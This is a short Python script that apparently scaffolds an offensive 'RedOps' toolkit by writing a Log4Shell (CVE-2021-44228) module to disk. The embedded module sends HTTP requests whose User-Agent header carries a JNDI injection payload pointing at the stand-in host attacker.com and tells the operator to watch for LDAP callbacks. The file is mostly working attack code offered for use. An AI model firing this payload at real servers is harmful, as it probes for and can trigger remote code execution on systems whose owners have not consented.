from pathlib import Path

project_root = Path(__file__).resolve().parent.parent
exploit_dir = project_root / "RedOps" / "Core" / "exploits"
exploit_dir.mkdir(parents=True, exist_ok=True)

# Log4Shell exploit
log4shell_code = """
import requests

def check_log4shell_vuln(target):
    print(f"[+] Checking Log4Shell (CVE-2021-44228) on {target}")
    headers = {
        "User-Agent": "${jndi:ldap://attacker.com/a}"
    }
    try:
        r = requests.get(target, headers=headers, timeout=5)
        print("[*] Request sent with JNDI payload. Check your LDAP callback logs.")
        return True
    except Exception as e:
        print(f"[!] Error during check: {e}")
        return False

def simulate_exploit(target):
    print("[*] Simulating exploit. (No real JNDI callback launched)")
    print("[!] In a real-world scenario, this would send a JNDI request to your listener.")
"""

log4shell_path = exploit_dir / "log4shell.py"
log4shell_path.write_text(log4shell_code.strip(), encoding="utf-8")

init_path = exploit_dir / "__init__.py"
if not init_path.exists():
    init_path.write_text("", encoding="utf-8")

print(f"[âœ”] Log4Shell module saved at: {log4shell_path.relative_to(project_root)}")